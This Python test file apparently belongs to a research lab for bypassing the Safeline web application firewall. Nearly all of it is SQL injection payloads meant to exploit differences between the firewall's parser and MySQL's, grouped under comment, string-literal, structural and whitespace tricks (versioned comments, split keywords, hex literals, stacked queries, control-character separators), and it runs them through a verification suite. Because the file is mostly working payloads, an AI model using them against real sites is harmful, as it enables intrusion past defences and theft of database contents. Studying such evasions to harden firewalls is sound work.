"""
bypass_lab/test_parser.py
==========================
Parser discrepancy attacks — exploit differences between Safeline's
SQL parser and MySQL's actual parser (WAFFLED-style approach).

Key insight: if Safeline's parser and MySQL's parser disagree on what
a string means, we can craft input MySQL executes but Safeline misses.
"""
import sys
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
from bypass_lab.verify import run_suite

M = "'SEQSQLI_START','SEQSQLI_END'"


cases_comment = [
    # --- Nested / unusual comments ---
    ("mysql versioned /*!...*/",
     f"-1' /*!UNION*/ /*!SELECT*/ database(),{M}-- -"),
    ("versioned 50000",
     f"-1' /*!50000UNION*/ /*!50000SELECT*/ database(),{M}-- -"),
    ("versioned with space inside",
     f"-1' /*! UNION */ /*! SELECT */ database(),{M}-- -"),
    ("comment inside keyword split",
     f"-1' UN/**/ION SE/**/LECT database(),{M}-- -"),
    ("triple comment",
     f"-1' UNION/**//**/SELECT database(),{M}-- -"),
    ("multiline comment with newline",
     f"-1' UNION/*\n*/SELECT database(),{M}-- -"),
    ("comment between func and paren",
     f"-1' UNION SELECT database/**/(  ),{M}-- -"),
]

cases_string = [
    # --- String literal tricks ---
    ("concat string bypass",
     f"-1' UNION SELECT 'sec'||'urity',{M}-- -"),
    ("split string via CONCAT",
     f"-1' UNION SELECT CONCAT('sec','urity'),{M}-- -"),
    ("N prefix string (nchar)",
     f"-1' UNION SELECT N'security',{M}-- -"),
    ("X hex string",
     f"-1' UNION SELECT X'7365637572697479',{M}-- -"),
    ("b binary literal string",
     f"-1' UNION SELECT 0x7365637572697479,{M}-- -"),
]

cases_structure = [
    # --- Structural ambiguity ---
    # Inject via subquery instead of direct UNION
    ("subquery in select col",
     f"-1' UNION SELECT (SELECT database()),{M}-- -"),
    ("double subquery",
     f"-1' UNION SELECT (SELECT (SELECT database())),{M}-- -"),
    ("subquery from dual",
     f"-1' UNION SELECT (SELECT database() FROM DUAL),{M}-- -"),

    # Bypass via WHERE subquery (no UNION)
    ("where subquery exfil",
     f"1' AND (SELECT database())='security'-- -"),
    ("where like exfil",
     f"1' AND database() LIKE 'sec%'-- -"),

    # --- Semicolon stacked ---
    ("stacked: SELECT after semicolon",
     f"1';SELECT database()-- -"),
    ("stacked: UNION after semicolon",
     f"1'; -1 UNION SELECT database(),{M}-- -"),

    # --- Operator tricks ---
    ("minus sign no space",
     f"-1'UNION SELECT database(),{M}-- -"),
    ("plus sign injection",
     f"1+0' UNION SELECT database(),{M}-- -"),

    # --- LIMIT bypass ---
    ("limit offset trick",
     f"-1' UNION SELECT database(),{M} LIMIT 0,1-- -"),
    ("procedure analyse",
     f"-1' UNION SELECT database(),{M} PROCEDURE ANALYSE(1,1)-- -"),

    # --- INTO @var side channel ---
    ("into var assign",
     f"-1' UNION SELECT database() INTO @d-- -"),

    # --- Using clause ---
    ("USING charset",
     f"-1' UNION SELECT database() USING utf8,{M}-- -"),
]

cases_whitespace_creative = [
    # Non-standard but MySQL-valid separators
    ("tab between quote and UNION",
     f"-1'\tUNION\tSELECT\tdatabase(),{M}-- -"),
    ("newline between keywords",
     f"-1'\nUNION\nSELECT\ndatabase(),{M}-- -"),
    ("CR between keywords",
     f"-1'\rUNION\rSELECT\rdatabase(),{M}-- -"),
    ("multiple spaces",
     f"-1'   UNION   SELECT   database(),{M}-- -"),
    ("tab+newline mix",
     f"-1'\t\nUNION\t\nSELECT\t\ndatabase(),{M}-- -"),
    # The key: what if we use A COMBINATION that Safeline hasn't seen?
    ("newline+tab+case",
     f"-1'\n\tuNiOn\n\tsElEcT\n\tdatabase(),{M}-- -"),
    ("null_byte after quote",
     f"-1'\x00UNION SELECT database(),{M}-- -"),
    ("bell char separator",
     f"-1'\x07UNION\x07SELECT\x07database(),{M}-- -"),
    ("backspace separator",
     f"-1'\x08UNION\x08SELECT\x08database(),{M}-- -"),
]

if __name__ == "__main__":
    run_suite("Comment & Structural Tricks", cases_comment + cases_structure)
    run_suite("String Literal Tricks", cases_string)
    run_suite("Whitespace Creative Combos", cases_whitespace_creative)
